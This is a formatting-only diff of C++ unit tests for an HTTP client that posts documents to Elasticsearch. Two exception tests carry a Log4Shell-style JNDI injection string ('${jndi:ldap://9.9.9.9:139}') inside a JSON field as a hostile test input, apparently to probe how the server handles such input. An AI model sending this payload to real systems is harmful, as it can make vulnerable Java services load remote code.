@@ -31,8 +31,7 @@ TEST(HttpClient, Test_Normal_Post) { /*{{{*/
   EXPECT_NEQ(kOk,
              r);  // TODO: considering r: kHttpStatusRedirect             = 302, // Move temporarily
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -110,8 +109,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Bulk) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -131,8 +129,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Index) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -153,8 +150,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Search) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -193,8 +189,7 @@ TEST(HttpClient, Test_Exception_ES_Post_Index) { /*{{{*/
     url.append(buf);
     url.append("?pretty");
 
-    std::string post_params =
-        "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
+    std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
     post_params.append(1, 0xe8);
     post_params.append(1, 0xb4);
     post_params.append("\"}");
@@ -204,8 +199,7 @@ TEST(HttpClient, Test_Exception_ES_Post_Index) { /*{{{*/
     r = http_client.Post(url, post_params, &result);
     EXPECT_EQ(kOk, r);
     if (r != kOk) {
-      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-              post_params.c_str(), r);
+      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
     }
 
     fprintf(stderr, "%s\n", result.c_str());
@@ -274,8 +268,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Bulk_UsingNameAndPwd) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -300,8 +293,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -327,8 +319,7 @@ TEST(HttpClient, Test_Normal_ES_Post_Search_UsingNameAndPwd) { /*{{{*/
   r = http_client.Post(url, post_params, &result);
   EXPECT_EQ(kOk, r);
   if (r != kOk) {
-    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-            post_params.c_str(), r);
+    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
   }
 
   fprintf(stderr, "%s\n", result.c_str());
@@ -377,8 +368,7 @@ TEST(HttpClient, Test_Exception_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
     url.append(buf);
     url.append("?pretty");
 
-    std::string post_params =
-        "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
+    std::string post_params = "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
     post_params.append(1, 0xe8);
     post_params.append(1, 0xb4);
     post_params.append("\"}");
@@ -388,8 +378,7 @@ TEST(HttpClient, Test_Exception_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
     r = http_client.Post(url, post_params, &result);
     EXPECT_EQ(kOk, r);
     if (r != kOk) {
-      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
-              post_params.c_str(), r);
+      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(), post_params.c_str(), r);
     }
 
     fprintf(stderr, "%s\n", result.c_str());
